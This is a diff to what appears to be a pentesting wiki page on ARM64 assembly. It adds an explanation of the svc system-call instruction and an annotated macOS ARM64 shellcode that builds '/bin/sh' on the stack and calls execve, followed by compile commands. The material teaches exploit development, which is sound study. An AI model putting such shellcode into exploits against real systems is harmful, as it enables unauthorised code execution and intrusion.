@@ -81,6 +81,64 @@ ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where
   * Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
 * **`stur`**: **Store a register value to a memory location**, using an offset from another register.
   * Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
+* &#x20;**`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.
+  *   Example:&#x20;
+
+      ```armasm
+      mov x8, 93  ; Load the system call number for exit (93) into register x8.
+      mov x0, 0   ; Load the exit status code (0) into register x0.
+      svc 0       ; Make the system call.
+      ```
+
+## macOS
+
+### syscalls
+
+Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master).
+
+### Shellcodes
+
+#### Shell
+
+Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.
+
+```armasm
+.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
+.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
+.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
+
+_main:
+    ; We are going to build the string "/bin/sh" and place it on the stack.
+    
+    mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
+    movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
+    movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
+    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+
+    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
+
+    ; Prepare arguments for the execve syscall.
+    
+    mov  x1, #8       ; Set x1 to 8.
+    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
+    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+
+    ; Make the syscall.
+    
+    mov  x16, #59     ; Move the execve syscall number (59) into x16.
+    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+
+```
+
+To compile:
+
+{% code overflow="wrap" %}
+```bash
+as -o shell.o shell.s
+ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
+```
+{% endcode %}
 
 <details>
 
